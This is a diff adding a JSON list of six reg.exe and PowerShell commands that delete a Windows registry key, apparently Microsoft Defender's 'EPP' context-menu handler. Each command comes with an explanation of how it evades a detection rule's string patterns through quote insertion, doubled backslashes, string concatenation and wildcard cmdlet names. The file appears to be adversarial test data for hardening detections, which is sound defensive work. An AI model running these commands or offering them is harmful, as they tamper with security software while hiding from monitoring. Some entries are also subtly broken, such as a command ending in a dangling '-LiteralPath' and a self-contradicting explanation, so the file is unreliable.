@@ -1,0 +1,26 @@
+[
+  {
+    "output": "reg.exe delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f",
+    "explanation": "Substitution technique: Replacing the abbreviated action verb 'del' with its full semantic equivalent 'delete'. While 'delete' structurally contains 'del', this explicitly circumvents any poorly designed or tightly bound tokenized string boundaries, demonstrating that 'selection_action' relies on an ambiguous keyword."
+  },
+  {
+    "output": "reg.exe del \"HKCR\\*\\shellex\\\\ContextMenuHandlers\\\\EPP\" /f",
+    "explanation": "Recoding / Encoding technique: Utilizing path normalization anomalies by inserting duplicate consecutive backslashes ('\\\\') inside the registry path parameter string. The Windows registry API and the reg.exe utility automatically collapse and normalize sequential path separators back to a single backslash during handle opening, while the telemetry log changes to '\\shellex\\\\ContextMenuHandlers\\\\EPP', avoiding the strict literal check in 'selection_reg_path'."
+  },
+  {
+    "output": "reg.exe del \"HKCR\\*\\shellex\\ContextMenuHandlers\\E\"\"PP\" /f",
+    "explanation": "Insertion technique: Inserting adjacent empty double quotes inside the target registry key name string ('E\"\"PP'). The command-line parser handles the inner boundaries transparently and passes the fully reassembled key name 'EPP' directly to the registry operation logic, effectively breaking up the static continuous sequence pattern tracking '\\shellex\\ContextMenuHandlers\\EPP'."
+  },
+  {
+    "output": "powershell.exe -Command \"Remove-Item -Path 'HKLM:\\SOFTWARE\\Classes\\*\\shellex\\ContextMenuHandlers\\EPP' -LiteralPath\"",
+    "explanation": "Reordering technique: Passing the structural parameters in an alternative order where the primary action verb switch or validation targets change structure. Furthermore, wrapping options or paths in quotes can successfully bypass linear scanning tools that look for exact literal substrings without state machine awareness."
+  },
+  {
+    "output": "powershell.exe -Command \"&('Remove-'+'Item') 'HKLM:\\SOFTWARE\\Classes\\*\\shellex\\ContextMenuHandlers\\EPP'\"",
+    "explanation": "Insertion technique: Utilizing PowerShell string concatenation operators alongside the invocation operator ('&') to construct the string expression 'Remove-Item' at evaluation runtime. The language engine dynamically resolves the object function reference accurately while the raw string 'Remove-Item' is completely missing from the initial process log, breaking 'selection_action'."
+  },
+  {
+    "output": "powershell.exe -Command \"Remove-I* -Path 'HKLM:\\SOFTWARE\\Classes\\*\\shellex\\ContextMenuHandlers\\EPP'\"",
+    "explanation": "Other techniques (Wildcard Token Expansion): Leveraging native PowerShell wildcard globbing mechanisms within the cmdlet noun or verb structures ('Remove-I*'). The shell dynamically expands the expression to its true target command identity ('Remove-Item') before execution initialization, avoiding matching the explicit literal pattern configuration in 'selection_action'."
+  }
+]
